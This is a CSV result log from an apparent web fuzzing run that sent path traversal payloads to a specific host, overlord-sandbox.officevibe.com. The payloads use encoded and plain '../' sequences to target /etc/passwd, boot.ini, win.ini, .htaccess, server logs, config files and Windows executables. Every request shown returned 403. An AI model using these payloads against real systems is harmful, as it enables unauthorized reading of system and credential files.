FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..//etc/passwd;index.html,https://overlord-sandbox.officevibe.com/..//etc/passwd;index.html,,55856,403,312,17,7,text/html; charset=us-ascii,28.126562ms,
css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord-sandbox.officevibe.com/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,56912,403,312,17,7,text/html; charset=us-ascii,28.303273ms,
..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,57302,403,312,17,7,text/html; charset=us-ascii,28.885892ms,
cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/cgi-bin/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,57730,403,312,17,7,text/html; charset=us-ascii,27.961856ms,
//../../data/config/microsrv.cfg,https://overlord-sandbox.officevibe.com///../../data/config/microsrv.cfg,,63058,403,312,17,7,text/html; charset=us-ascii,27.657198ms,
../../apache/logs/access.log,https://overlord-sandbox.officevibe.com/../../apache/logs/access.log,,65127,403,312,17,7,text/html; charset=us-ascii,27.990278ms,
..\\..\\..\\..\\..\\..\\..\\boot.ini,https://overlord-sandbox.officevibe.com/..\\..\\..\\..\\..\\..\\..\\boot.ini,,65982,403,312,17,7,text/html; charset=us-ascii,29.467073ms,
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://overlord-sandbox.officevibe.com/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,67936,403,312,17,7,text/html; charset=us-ascii,27.567054ms,
static/..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5c..%5cetc/passwd,,70464,403,312,17,7,text/html; charset=us-ascii,30.375416ms,
../webserver.ini,https://overlord-sandbox.officevibe.com/../webserver.ini,,73462,403,312,17,7,text/html; charset=us-ascii,28.386758ms,
xyz/../../ThinVnc.ini,https://overlord-sandbox.officevibe.com/xyz/../../ThinVnc.ini,,74299,403,312,17,7,text/html; charset=us-ascii,33.205145ms,
static/../../../a/../../../../etc/passwd,https://overlord-sandbox.officevibe.com/static/../../../a/../../../../etc/passwd,,74451,403,312,17,7,text/html; charset=us-ascii,30.946744ms,
static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,77730,403,312,17,7,text/html; charset=us-ascii,28.147793ms,
..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5c..%5c..%5cetc/passwd,,78884,403,312,17,7,text/html; charset=us-ascii,27.850146ms,
../../logs/error.log,https://overlord-sandbox.officevibe.com/../../logs/error.log,,84935,403,312,17,7,text/html; charset=us-ascii,27.885899ms,
static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,88703,403,312,17,7,text/html; charset=us-ascii,28.194257ms,
static/../../../../windows/win.ini.,https://overlord-sandbox.officevibe.com/static/../../../../windows/win.ini.,,88730,403,312,17,7,text/html; charset=us-ascii,27.434475ms,
..//..///etc/passwd,https://overlord-sandbox.officevibe.com/..//..///etc/passwd,,89982,403,312,17,7,text/html; charset=us-ascii,27.983365ms,
..\..\..\..\..\..\temp\temp.class,https://overlord-sandbox.officevibe.com/..\..\..\..\..\..\temp\temp.class,,91616,403,312,17,7,text/html; charset=us-ascii,27.558968ms,
../manager/text,https://overlord-sandbox.officevibe.com/../manager/text,,91797,403,312,17,7,text/html; charset=us-ascii,27.622727ms,
..%5c..%5cetc/passwd,https://overlord-sandbox.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,28.545136ms,
../../../../apache/logs/error.log,https://overlord-sandbox.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,28.899225ms,
..////etc/passwd,https://overlord-sandbox.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,27.625576ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-sandbox.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,27.789496ms,
.//..///etc/passwd,https://overlord-sandbox.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,27.692021ms,
../../../.htaccess,https://overlord-sandbox.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,28.25239ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,https://overlord-sandbox.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,27.552886ms,
